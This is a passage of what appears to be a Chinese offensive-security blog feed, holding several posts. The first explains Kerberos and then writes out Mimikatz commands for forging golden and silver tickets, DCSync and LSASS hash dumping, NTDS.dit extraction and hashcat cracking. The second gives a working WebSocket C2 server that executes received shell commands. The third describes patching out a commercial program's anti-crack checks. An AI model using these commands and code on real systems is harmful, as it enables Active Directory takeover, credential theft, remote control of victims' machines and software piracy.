alt="14122235056423.jpg!small"></p><pre><code>kerberons协议理解：Kerberos是windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份验证。相互认证或请求服务的实体被称为委托人(Principal)。参与的中央服务器被称为发布中心（简称KDC）。KDC有两个服务组成：身份验证服务（Authentication Server 简称AS）和票据授予服务（Ticket Granting Server，简称TGS）。在windows域环境下，身份验证服务和票据授予服务可同时运行在任何可写域控服务器上。委托人（Principal）是一个具有唯一标识的实体，可以是一台计算机或一项服务，通过使用KDC颁发的票据来进行通信。委托人可以分为两类：用户和服务，分别具有不同种类的标识符。用户通过&quot;user@REALM&quot;格式的用户主体名称（User Principal Name,简称UPN来标识）。记住REALM一定是大写的。例如用户&quot;bob&quot;在&quot;bhusa.com&quot;域中应该表示为bob@BHUSA.com服务主题名称（Service Principal Name，简称SPN）是用于域中的服务和计算机账户。SPN的格式形如&quot;serviceclass/host_port/serviceName&quot;。例如，主机&quot;dc1.bhusa.com&quot;上LDAP服务的SPN可能类似于&quot;ldap/dc1.bhusa.com&quot;,&quot;ldap/dc1&quot;和&quot;ldcap/dc1.bhusa.com/bhusa.com&quot;。参考全限定主机名和仅主机名，应该服务可能注册多个SPN同通常是执行DNS查询来规范化主机名称。这就解释了DNS为什么微软Kerberos环境中的一个必要租件。查询服务&quot;规范化&quot;名称，然后生成请求服务的SPN。用户要访问活动目录中的一项服务访问需经过以下几个步骤1.客户端对用户口令执行散列运算(hash)。此hash值（即用户密钥）成为客户端和KDC共享的长期密钥（long term key）2.KRB_AS_REQ-客户端加密一个时间戳，然后发送给身份验证服务3.KRB_AS_REP-身份验证服务会解密时间戳，若解密成功，表明了客户端获得某个特定用户的口令（即验证了用户的身份）①短期会话密钥，用于客户端向KDC发起后续的请求，该消息经客户端的长期密钥加密。（此短期会话密钥仅适用于该客户端和KDC之间）②票据授予票据（Ticket Granting Ticket，简称TGT），包含有关用户名、域名、时间和组成员资格等信息。该消息经仅可知KDC的密钥加密（在Windows环境中为krbtgt账户的NT-Hash）。记住KDC不记录状态：客户端每次请求访问一项服务时，TGT都会被转发。4.KRB_TGS_REQ-客户端使用AS返回的会话密钥构建访问特定服务的请求。客户端把TGT连同请求一起发送到票据授予服务5.KRB_TGS_REP-票据授予服务向客户端发送一个服务票据（Service Ticket，简称ST），包括两个部分*1远程服务器的部分-包括请求用户的组员资格，时间戳，用于客户端和远程服务器之间通信的会话密钥。使用远程服务器和KDC共享的长期密钥加密这部分消息*2.客户端的部分-包含用于客户端和远程服务器之间通信的会话密钥。使用步骤3中AS回复的短期会话密钥加密这部分消息6.KRB_TGS_REQ-客户端把服务票据中的服务器部分和请求一起发送到远程服务器。远程服务器将直接接受该服务器票据，并不需要和KDC直接通信，因为该票据是用远程服务器和KDC共享的长期密钥加密过。解密成功即成功表名KDC已经允许了此次通信。自己理解：A为客户端（Principal），B为服务端A要登陆B，A必须有B的用户。A在登陆B的界面输入了用户名和明文密码Administrator/123456。A在发送请求之前会把B用户口令进行hash运算。如果验证通过，这个hash值会成为A和B通信的长期密钥。进行hash运算后，A会加密一个时间戳。然后发送给身份验证服务（AS）然后AS会解密时间戳，如果解密成功，表示A成功验证了用户的身份。然后AS会返回会话密钥构建的信息要求A访问特定服务的请求A会把TGT连同请求一同发送到TGS，TGS收到后会把ST发送回给BB收到TGS发回来的票据后，A使用票据和请求推送到远程服务器。远程服务器将直接接受该票据。然后A成功登陆到B通俗理解：你面前有一道门，门后面有钱。要通过这道门你必须要有门的钥匙，当把钥匙插入到锁里面的时候。钥匙会和锁芯进行配对，如果配对成功就会返回咔的一声。代表你能扭动钥匙解锁这把锁，如果钥匙和锁芯对不上钥匙就会被弹出来。当你扭动钥匙的时候，就代表身份验证已经通过你正在开这把锁。当这把锁被开了后你就成功拿到门后面的钱关于krbtgt账户和TGT的问题1. 问题一：微软对长期密钥的散列值不加SALT微软实现的Kerberos版本对MIT原始版本中的一个关键函数做了修改，最终降低了底层的安全性。在MIT原始版本中，首先在明文口令中添加字符串username@DOMAIN.COM，然后经过散列运算生成长期密钥。使用用户名给密码加盐，能够为碰巧密码相同的不同用户生成不同的散列值。只要涉及到密钥的操作，仍然需要使用实际的口令。在微软实现版本中，口令转换成Unicode格式，再经过MD4运算生成没有加盐的密钥。这种情况也被称为NT-Hash，和微软十多年来存储长度大于14字符的密码的格式一样。缺少salt意味着任何需要密钥的操作能够直接地使用密码的散列版本，而不是使用实际的密码。这听上去像大家耳熟能详的“pass-the-hash”攻击的根本原因。从一个攻击者的角度出发，如果能够提取该域的密码散列值，也就可以利用KRBTGT散列值来伪造TGT。虽然提取散列值看似难以实现，然而实际上，大部分渗透人员认为在普通的企业环境中这并不是一件困难的事情。我们会在白皮书下面的一个章节中作全面深入的解析。利用思路在微软活动目录中颁发的TGT是可移植的。由于Kerberos的无状态特性，TGT中并没有关于票据来源的标识信息。这意味着可以从某台计算机上导出一个有效的TGT，然后导入到该环境中其他的计算机上。新导入的票据可以用于域的身份认证，并拥有票据中指定用户的权限来访问网络资源。这种特别的攻击方法被称为“pass-the-ticket”攻击。所谓的票据攻击就是伪造票据客户端的有效性由于Kerberos是无状态的，TGT必须包含了同票据授予服务交互所需的全部信息。根据微软实现的Kerberos协议扩展（MS-KILE），KDC负责设置TGT中相应的标志位，而票据授予服务使用这些标志位来颁发服务票据。默认情况下，TGT携带了有关用户的组成员资格、票据所使用的加密类型以及票据的有效期等信息。此外，微软使用TGT来加强域上传统的和最新的身份认证策略。TGT包含一些传统的值来限制账户，例如登录时长、账户是否禁用、账户是否过期、密码失效的时间戳。万能票据（Golden Ticket）综上所述，微软实现的Kerberos版本中存在的一系列问题所引发的后果是：Kerberos成为了攻击者实施Post-Exploitation的游乐场。如果攻击者能够攻陷KDC和提取KRBTGT散列值。然后利用这些有限信息，攻击者能够为委托人生成任意的TGT。Mimikatz工具把这种特性称之为“万能票据”（golden ticket，直译为“黄金票据”，为突出功能上的特点，意译译为“万能票据”）。万能票据拥有一些有趣的属性，会导致传统企业域中一些严重的安全问题。首先，万能票据是全功能的TGT。也就意味着万能票据可用于Kerberos认证的任何服务。票据授予服务盲目地相信TGT中的信息，然后处理TGT并颁发服务票据。内存中插入万能票据并不需要提升权限。而且默认情况下，万能票据的有效期是10年。其次，万能票据可以用来绕过当前Kerberos有关加密策略的要求。例如，可以使用DES或RC4加密算法创建一个TGT，即使该域明确支持AES，禁止使用DES或RC4。此情况会产生一个有趣的现象：TGT使用DES加密而服务票据使用AES加密。票据授予服务似乎并不担心TGT，也不拒绝异常行为，因为没有机制让票据授予服务报告关于策略的错误。再次，万能票据并没启用任何高级账户策略的设置。微软添加了一个功能来验证服务票据的请求，以确保已禁用的TGT不能用于获得服务票据。然而，该功能的实现存在问题。只有当TGT的寿命超过20分钟时，票据授予服务才会验证TGT的有效性。如果TGT的寿命低于20分钟，票据授予服务将直接颁发服务票据，而不去验证TGT的有效性，默认情况下服务票据具有10小时的有效期。因为攻击者可以利用Mimikatz工具随心所欲的产生票据，所以攻击者只需清除旧的TGT，再替换为寿命少于20分钟的新票据，轻松突破20分钟的限制条件。最终，万能票据可以被配置成任意用户和任意组的成员。这也可以创建一个票据，票据中任何用户都可以是任意组的成员。这可以用来绕过文件服务器或其他应用程序上基于用户组的访问限制。万能票据中的用户和SID不必在活动目录中真实存在。也就意味着可以为域中不存在的用户创建TGT,并仍然可以在TGT生命周期内前20分钟内从票据授予服务获得服务票据。归根结底，在一个企业的活动目录的环境中，如果KRBTGT账户的丢失，也就意味着环境中的信任关系完全丧失。考虑到攻击者可以生成任意的Kerberos票据，能绕过对任意用户的账户策略，能够让用户成为任意组的成员，所以攻击者简直可以横行无阻。此外，鉴于KRBTGT账户极少更改散列值，攻击者可以在较长的时间内使用这些伪造的票据创建“万能票据”的所需条件：视频：https://www.youtube.com/watch?v=eNbujcPn5c4①krbtgt账户的NT-Hash：该散列值是用于Kerberos的秘密密钥，仅位于域控服务器的活动目录中。所以攻击者必须攻陷域控服务器并提权至管理员权限；（域管理员权限）②域账户名称：通常是域管理员“domain admin”；③域名称；④域SID：可以从域用户的SID或通过sysinternal中psGetsid.exe获得；黄金票据是伪造票据授权授权票据（TGT）黄金票据的局限性：黄金票据欺骗了当前域的管理权限，当KRBTGT账户密码哈希显示在作为多域AD的林一部分的子域中时存在局限性。因为是root域包含全森林管理组。由于Mimikatz通过相对标识符（RID）向票据添加了组成员资格，因此Kerberos票据中的企业管理RID在其创建的域中（基于KRBTGT账户域）被标识为本地。如果通过获取域SID和附加RID创建的域安全标识符(SID)不存在,那么Kerberons票据的持有者不会收到该级别的访问权限。换句话说，在一个多域AD森林中，如果创建的GT（黄金票据）域不包含Enterprise Admins组，则GT不会向森林中其他域提供管理权限。在单个域控AD林中不存在局限性。换句话说，黄金票据在多个AD（域控中）受到只有一个域控的完全控制权限。而在单个AD（域控中）无局限性。绕过黄金票据的局限性在迁移方案中，从DomainA迁到DomainB的用户将原始DomainA用户SID值添加到DomainB的SID History属性中。当用户使用新用户登陆DomainB时，DomainA SID将与确定访问DomainB用户组一起验证。这意味着可以将SID添加到SID历史记录以扩展访问。一旦Mimikatz支持Golden和（Silver Tickets）中的SID History，事情会变的更加有趣，因为AD Forest中的任何组都可以被包含并且用于授权访问。使用最新版本的Mimikatz，我们现在可以将SID历史记录添加到Forest Enterpise Admin组的Golden Ticket中。一旦单个域名的KRBTGT账户密码哈希被捕获到时，通过黄金票据可以伪造用户登陆到整个森林中。使用Mimikatz伪造Kerberons黄金票据kerberos::golden  /admin:ADMIINACCOUNTNAME  /domain:DOMAINFQDN /id:ACCOUNTRID  /sid:DOMAINSID  /krbtgt:KRBTGTPASSWORDHASH  /ptt生成hash值命令例子：kerberos::golden  /admin:darthvader  /domain:lab.adsercurity.org /id:2601  /sid: S-1-5-21-4155807533-921486164-2767329826 /krbtgt:8a2f1adcdd519a23515780021d2d178a  /ptt导出hashmimikatz log  &quot;lsadump::dcsync /domain:test.local /user:krbtgt&quot;找到如下信息：/domain：test.local/sid:S-1-5-21-4155807533-921486164-2767329826/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f2、生成Golden Ticket伪造的用户设置为god,执行:mimikatz &quot;kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f /user:god/ticket:gold.kirbi&quot;生成文件gold.kirbi3、伪造Golden Ticket获得域控权限导入Golden Ticket，执行如下命令：kerberos::ptt c:\test\gold.kirbi/domain -----完整的域名，在这个例子中：“lab.adsecurity.org”/ sid ----域的SID,在这个例子中：“S-1-5-21-1473643419-774954089-2222329127”/ sids --- AD森林中账户/组的额外SID，凭证拥有权限进行欺骗。通常这将是根域Enterprise Admins组的“S-1-5-21-1473643419-774954089-5872329127-519”值。?  / user ---伪造的用户名/groups（可选）---用户所属的组RID（第一组是主组）。添加用户或计算机帐户RID以接收相同的访问权限。默认组：513,512,520,518,519为默认的管理员组。/ krbtgt---域KDC服务帐户（KRBTGT）的NTLM密码哈希值。用于加密和签署TGT。/ ticket（可选） - 提供一个路径和名称，用于保存Golden Ticket文件以便日后使用或使用/ ptt立即将黄金票据插入内存以供使用。/ ptt - 作为/ ticket的替代品 - 使用它来立即将伪造的票据插入到内存中以供使用。/ id（可选） - 用户RID。Mimikatz默认值是500（默认管理员帐户RID）。/ startoffset（可选） - 票据可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值是0。/ endin（可选） - 票据使用时间范围。Mimikatz默认值是10年（?5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。/ renewmax（可选） - 续订最长票据有效期。Mimikatz默认值是10年（?5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。/ sids（可选） - 设置为AD林中企业管理员组（ADRootDomainSID）-519）的SID，以欺骗整个AD林（AD林中每个域中的AD管理员）的企业管理权限。/ aes128 - AES128密钥/ aes256 - AES256密钥黄金票默认组：域用户SID：S-1-5-21 &lt;DOMAINID&gt; -513域管理员SID：S-1-5-21 &lt;DOMAINID&gt; -512架构管理员SID：S-1-5-21 &lt;DOMAINID&gt; -518企业管理员SID：S-1-5-21 &lt;DOMAINID&gt; -519（只有在森林根域中创建伪造票证时才有效，但为AD森林管理员权限添加使用/ sids参数）组策略创建者所有者SID：S-1-5-21 &lt;DOMAINID&gt; -520命令格式如下：kerberos :: golden / user：ADMIINACCOUNTNAME / domain：DOMAINFQDN / id：ACCOUNTRID / sid：DOMAINSID / krbtgt：KRBTGTPASSWORDHASH / ptt命令示例：.\mimikatz “kerberos::golden  /user:DarthVader  /domain:rd.lab.adsecurity.org  /id:500 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321  /ptt” exit参考文章：https://www.cnblogs.com/backlion/p/8127868.html白银票据：0x00介绍白银票据是伪造Kerberons票证授予服务（TGS）的票，也称为服务票据。白银票据与环境票据不一样的是，白银票据没有与域控进行通信，白银票据只能单一访问某个服务。0x01特点1.白银票据是一个有效的票据授予服务（TGS），因为Kerberons验证服务运行的每台服务器都对服务器主体名称的服务账户进行加密签名2.黄金票据是伪造TGT并且获得任何Kerberons服务，而白银票据是伪造（TGS）Kerberons票据，这意味着白银票据仅限于特定服务器上的任何服务3.大多数服务不验证PAC（通过将PAC校验和发送到域控进行PAC验证），因此使用服务账户密码哈希生成有效TGS可以完全伪造PAC4.攻击者需要服务账户密码哈希值5.TGS是伪造的，所有没有和TGT通信，这意味着DC验证过6.任何事件日志都在目标服务器上0x02要求1.域名2.域的SID3.域用户4.目标服务器的域名全称，此处为域控的全称5.用户ID（可选，管理员ID为500）6.运行在目标服务器上的kerberons服务，入mssql，http，cifs7.服务的NTLM散列（计算机用户或用户账户）命令例子：kerberons::golden /user:Haqksd /domain:haq.com /sid:S-1-5-21-2289215397-288801521-4019949533-1000  /tarfet:yk.haq.com /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /pt0x03引用文章的具体例子文章地址：https://www.cnblogs.com/backlion/p/8119013.html/domain –完整的域名称，如：lab.adsecurity.org/sid –域的SID，如：S-1-5-21-1473643419-774954089-2222329127/user – 域用户名/ groups（可选） - 用户所属的组RID/ ticket（可选） - 提供一个路径和名称，用于保存Golden Ticket文件以便日后使用，或者使用/ ptt立即将黄金票据插入到内存中以供使用 /ptt - 作为/ ticket的替代品，使用它来立即将伪造的票据插入到内存中以供使用。/ id（可选） - 用户RID，Mimikatz默认值是500（默认管理员帐户RID）/ startoffset（可选） - 票证可用时的起始偏移（如果使用此选项，通常设置为-10或0）Mimikatz默认值是0/ endin（可选） - 票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为10小时/ renewmax（可选） - 续订最长票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为最长为7天1.白银票据需要的参数/target –目标服务器的FQDNFQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号“.”）/service –运行在目标服务器上的kerberos服务，该服务主体名称类型如cifs，http，mssql等/rc4 –服务的NTLM散列（计算机帐户或用户帐户）2.白银票据默认组域用户SID：S-1-5-21 &lt;DOMAINID&gt; -513域管理员SID：S-1-5-21 &lt;DOMAINID&gt; -512架构管理员SID：S-1-5-21 &lt;DOMAINID&gt; -518企业管理员SID：S-1-5-21 &lt;DOMAINID&gt; -519组策略创建所有者SID：S-1-5-21 &lt;DOMAINID&gt; -5203. Mimikatz命令创建白银票据以下Mimikatz命令会在服务器adsmswin2k8r2.lab.adsecurity.org上为CIFS服务创建白银票据。为了成功创建Silver Ticket，需要从AD域转储中或在本地系统上运行Mimikatz来获获取adsmswin2k8r2.lab.adsecurity.org中AD计算机帐户密码哈希值。NTLM密码哈希与 rc4参数一起使用。服务SPN类型也需要在/ service参数中标识。目标计算机的FQDA需要在/ target参数中使用以及/ sid参数中的域SID。命令如下：mimikatz “kerberos::golden /user:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit 0x05 白银票据在各种服务中的实列  1.白银票据的服务列表 Service Type     Service Silver TicketsWMI     HOSTRPCSSPowerShell Remoting HOSTHTTPWinRM     HOSTHTTPScheduled Tasks     HOST Windows File Share (CIFS)     CIFS LDAP operations includingMimikatz DCSync LDAP Windows Remote Server Administration Tools     RPCSSLDAPCIFS2.Windows共享（CIFS）管理访问的银票为“ cifs ”服务创建白银票据，以获得目标计算机上任何Windows共享的管理权限。注入CIFS Silver Ticket后，我们现在可以访问目标计算机上的任何共享，包括c $共享，我们能够将文件拷贝到共享文件中。 3.具有管理员权限的Windows计算机（HOST）白银票据创建银票以获得目标计算机上所涵盖的任何Windows服务的管理员权限。这包括修改和创建计划任务的权限。利用HOST Silver Ticket，我们可以创建一个新的计划任务。或者通过利用HOST Silver Ticket，我们可以修改存在的计划任务。 4.Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行为“ http ”服务和“ wsman ”服务创建Silver Ticket，以获得目标系统上的WinRM和或PowerShell Remoting的管理权限。注入两张HTTP＆WSMAN白银票据后，我们可以使用PowerShell远程（或WinRM的）反弹出目标系统shell。首先New-PSSession使用PowerShell创建到远程系统的会话的PowerShell cmdlet，然后Enter-PSSession打开远程shell。 5.白银票据证连接到具有管理员权限Windows计算机上的LDAP为“ ldap ”服务创建Silver Ticket 以获得目标系统（包括Active Directory）上LDAP服务的管理权限。利用LDAP Silver Ticket，我们可以远程访问LDAP服务来获得krbtgt的信息注：lsadump::dcsync向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户，只读域控制器默认不允许读取用户密码数据。 6.白银票据证连接到具有管理员权限Windows计算机上的WMI 为“ HOST ”服务和“ rpcss ”服务创建白银票据，以使用WMI在目标系统上远程执行命令。注入这些白银票据之后，我们可以通过运行“klist”来确认Kerberos TGS票据在内存中注入白银票据后，我们可以通过“传票”来调用WMIC或Invoke-WmiMethod在目标系统上运行命令。Invoke-WmiMethod win32_process -ComputerName $ Computer -Credential $ Creds -name create -argumentlist“$ RunCommand”  7.访问域控上“cifs”服务实列首先需要获得如下信息：/domain/sid/target:目标服务器的域名全称，此处为域控的全称/service：目标服务器上面的kerberos服务，此处为cifs/rc4：计算机账户的NTLM hash，域控主机的计算机账户/user：要伪造的用户名，此处可用silver测试在域控上执行如下命令来获取域控主机的本地管理员账户hashmimikatz log &quot;sekurlsa::logonpasswords&quot;如图:注：此处要找到计算机账户，也就是Username : WIN-8VVLRPIAJB0$的NTLM hash，如果是其他账户，那么会失败,也就是需要共享服务账号。整理以上获得的信息如下：/domain:test.local/sid:S-1-5-21-4155807533-921486164-2767329826/target:WIN-8VVLRPIAJB0.test.local/service:cifs/rc4:d5304f9ea69523479560ca4ebb5a2155/user:silver使用mimikatz执行如下命令导入Silver Ticketmimikatz &quot;kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 /target:WIN-8VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt&quot;如图，成功导入，此时可以成功访问域控上的文件共享</code></pre><p>8.提取各种密码和hash</p><pre><code>用mimkatz提取密码和hash提取AD的哈希lsadumo::lsa /inject exit转储LSASS内存sekurlsa::minidump c:\temp\lsass.dmp提取KRBTGT用户账户的密码数据privilege::debug lsadump::dcsync /domain:域名     user:krbtgt exit管理员用户帐户提取密码数据：Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator&quot; exit从NTDS.DIT中提取哈希提取出来的文件通过ntdsdump是无法提取的通过esedbexport来恢复。安装：wget https://github.com/libyal/libesedb/releases/download/20170121/libesedb-experimental-20170121.tar.gz`apt-get install autoconf automake autopoint libtool pkg-config./configuremakemake installldconfigesedbexport -m tables ntds.dit大概需要（20-30分钟）最后生成在./ntds.dit.export/使用ntdsxtract提取域信息git clone https://github.com/csababarta/ntdsxtract.gitpython setup.py build &amp;&amp; python setup.py install提取哈希:(这里需要将刚拷出来的三个文件中的系统复制到当前目录下）$ dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/link_table.5 output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user_info.txt这样提取出来之后已经是转换成hashcat可破解的格式hashcat -m 1000 ntout ./password.txt</code></pre><p>9.DSRM密码同步将域控权限持久化</p><pre><code>获取到域控权限后如何利用DSRM密码同步将域管权限持久化。Windows Server 2008需要安装KB961320补丁才能支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni巧用DSRM密码同步将域控权限持久化http://drops.xmd5.com/static/drops/tips-9297.html</code></pre><h2 id="0x02相关资料"><a href="#0x02相关资料" class="headerlink" title="0x02相关资料"></a>0x02相关资料</h2><pre><code>SPN扫描https://adsecurity.org/?p=1508扫描SQLServer的脚本https://github.com/PyroTek3/PowerShell-AD-ReconKerberos的黄金门票https://adsecurity.org/?p=1640域服务账号破解实践http://bobao.360.cn/learning/detail/3564.htmlKerberos的认证原理http://blog.csdn.net/wulantian/article/details/42418231深刻理解windows安全认证机制ntlm＆Kerberos的Kerberos身份验证流程https://klionsec.github.io/2016/08/10/ntlm-kerberos/敞开的地狱之门kerberonshttps://www.freebuf.com/articles/system/45631.html黄金票据的使用https://www.youtube.com/watch?v=eNbujcPn5c4白银票据的使用https://www.youtube.com/watch?v=jVqKVdBYPp0</code></pre><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第一个c2通信脚本</title>
      <link href="/posts/d6f76024.html"/>
      <url>/posts/d6f76024.html</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>这几天在学校的实验室折腾c2通信。从一开始的不懂后面慢慢弄懂了，所谓的c2通信原理<br>是基于websocket上的操作。<br><img src="https://camo.githubusercontent.com/ed4690f37c4c7f83c5ba0ab669cc6d41ac9480f6/68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f327a6e6e6e373469637a646a6275732f6172636869746563747572652e6a70673f646c3d30" alt="68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f327a6e6e6e373469637a646a6275732f6172636869746563747572652e6a70673f646c3d30"></p><h2 id="0x01正文"><a href="#0x01正文" class="headerlink" title="0x01正文"></a>0x01正文</h2><p><b>原理：</b></p><pre><code>1.控制器运行Web / WebSocket服务器以及命令行界面，允许攻击者为代理输入命令2.代理程序在受害者的计算机上运行并执行从C2接收的任何指令，与处理与C2服务器的所有通信的浏览器进程交互3.通过COM接口控制的浏览器进程（Internet Explorer / Edge）通过WebScoket通道处理代理与C2服务器之间的所有通信</code></pre><p><b>连接过程</b></p><pre><code>第一种：1.创建websocket然后调用js进行连接2.将创建好的websocket放入到受害者机子3.本地调用js连接然后执行命令由受害者端接收到进行命令执行在返回给攻击者第二种：1.在肉鸡上创建websocket2.然后受害者连接，然后攻击者访问肉鸡执行命令3.受害者接收到执行命令，然后返回给肉鸡</code></pre><p><b>代码</b><br>服务端</p><pre><code>import asyncioimport websocketsimport osimport sysasync def hello(websocket,path):    try:        while True:            name = await websocket.recv() #接收客户端的信息            zx=os.popen(name) #执行命令            await websocket.send(zx.read()) #返回给客户端    except Exception as r:        print(&#39;[-] Error {}&#39;.format(r))start_server=websockets.serve(hello,&#39;{}&#39;.format(sys.argv[1]),sys.argv[2]) #创建websocketasyncio.get_event_loop().run_until_complete(start_server) #异步asyncio.get_event_loop().run_forever()</code></pre><p>客户端</p><pre><code>&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Web sockets test&lt;/title&gt;    &lt;script src=&quot;jquery-min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        var ws;        function ToggleConnectionClicked() {                          try {                    ws = new WebSocket(&quot;ws://IP:PORT&quot;);//连接服务器 （连接websocket服务器）                    ws.onopen = function(event){alert(&quot;已经与服务器建立了连接\r\n当前连接状 （连接成功后触发的事件）态：&quot;+this.readyState);};                    ws.onmessage = function(event){alert(&quot;接收到服务器发送的数据：\r\n&quot;+event.data);}; （接收到数据触发的事件）                    ws.onclose = function(event){alert(&quot;已经与服务器断开连接\r\n当前连接状态：&quot;+this.readyState);};  //异常触发的事件                    ws.onerror = function(event){alert(&quot;WebSocket异常！&quot;);};                } catch (ex) {                    alert(ex.message);                      }        };        function SendData() {            try{                var content = document.getElementById(&quot;content&quot;).value;                if(content){                    ws.send(content);                }            }catch(ex){                alert(ex.message);            }        };        function seestate(){            alert(ws.readyState);        }    &lt;/script&gt;&lt;/head&gt;&lt;body&gt;   &lt;button id=&#39;ToggleConnection&#39; type=&quot;button&quot; onclick=&#39;ToggleConnectionClicked();&#39;&gt;连接服务器&lt;/button&gt;&lt;br /&gt;&lt;br /&gt;   &lt;textarea id=&quot;content&quot; &gt;&lt;/textarea&gt;    &lt;button id=&#39;ToggleConnection&#39; type=&quot;button&quot; onclick=&#39;SendData();&#39;&gt;发送我的名字：beston&lt;/button&gt;&lt;br /&gt;&lt;br /&gt;    &lt;button id=&#39;ToggleConnection&#39; type=&quot;button&quot; onclick=&#39;seestate();&#39;&gt;查看状态&lt;/button&gt;&lt;br /&gt;&lt;br /&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><b>测试</b><br><img src="https://s1.ax1x.com/2018/12/14/FU1PvF.jpg" alt="FU1PvF.jpg"></p><p><img src="https://s1.ax1x.com/2018/12/14/FU1Fu4.md.png" alt="FU1Fu4.md.png"></p><p>在安有360的机子上进行测试：<br>视频:<a href="https://v.youku.com/v_show/id_XMzk2NDI2MjI0MA==.html?spm=a2hzp.8253869.0.0" target="_blank" rel="noopener">c2通信实现—其他—视频高清在线观看-优酷</a></p><p><b>一些c2的项目</b><br><a href="https://github.com/nettitude/PoshC2" target="_blank" rel="noopener">GitHub - nettitude/PoshC2: Powershell C2 Server and Implants</a><br><a href="https://github.com/Arno0x/WSC2" target="_blank" rel="noopener">GitHub - Arno0x/WSC2: A WebSocket C2 Tool</a><br><b>参考文章</b><br><a href="https://arno0x0x.wordpress.com/2017/11/10/using-websockets-and-ie-edge-for-c2-communications/" target="_blank" rel="noopener">Using WebSockets and IE/Edge for C2 communications – arno0x0x</a></p><p>github地址：<a href="https://github.com/422926799/python/tree/master/c2%E9%A1%B9%E7%9B%AE" target="_blank" rel="noopener">python/c2项目 at master · 422926799/python · GitHub</a></p><p><b>后续开发的一些建议</b></p><pre><code>1.实现以上说的方法2.加密传输</code></pre><p>转载请注明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>去除淘小秘暗桩</title>
      <link href="/posts/51e4fe35.html"/>
      <url>/posts/51e4fe35.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一般的PE为了防止别人破解。都会给自己加上暗桩，你破解ok。但是我就把你电脑格盘重启蓝屏等等之类的东东…所以玩破解最好虚拟机里面搞。<br><img src="https://s1.ax1x.com/2018/12/09/FG9MPU.jpg" alt="FG9MPU.jpg"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>暗桩一般是在你破解完程序后出现的，比如淘小秘这个就是。将主控制窗口剥离出来后，发现无法打开<br><img src="https://s1.ax1x.com/2018/12/09/FG9wGD.png" alt="FG9wGD.png"><br>根据他自动退出的条件，然后载入自动退出的API断点，然后运行程序。<br><img src="https://s1.ax1x.com/2018/12/09/FG9BxH.png" alt="FG9BxH.png"><br>点击，最近的（第一个返回到xxx）。右键在反汇编窗口中显示调用<br><img src="https://s1.ax1x.com/2018/12/09/FG9yqI.png" alt="FG9yqI.png"><br>然后发现有个call，直接nop掉保存退出<br><img src="https://s1.ax1x.com/2018/12/09/FG9IMj.png" alt="FG9IMj.png"><br>Nop掉<br><img src="https://s1.ax1x.com/2018/12/09/FGC3Y8.png" alt="FGC3Y8.png"><br>发现可以成功打开<br><img src="https://s1.ax1x.com/2018/12/09/FGCBkV.md.png" alt="FGCBkV.md.png"></p><h3 id="得到的一些总结"><a href="#得到的一些总结" class="headerlink" title="得到的一些总结"></a>得到的一些总结</h3><pre><code>如果程序出现暗桩可以下程序退出的断点，获取用 其他办法在暗桩出现的地方暂停，去除暗桩即可</code></pre><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sql注入过防注入笔记</title>
      <link href="/posts/acb30657.html"/>
      <url>/posts/acb30657.html</url>
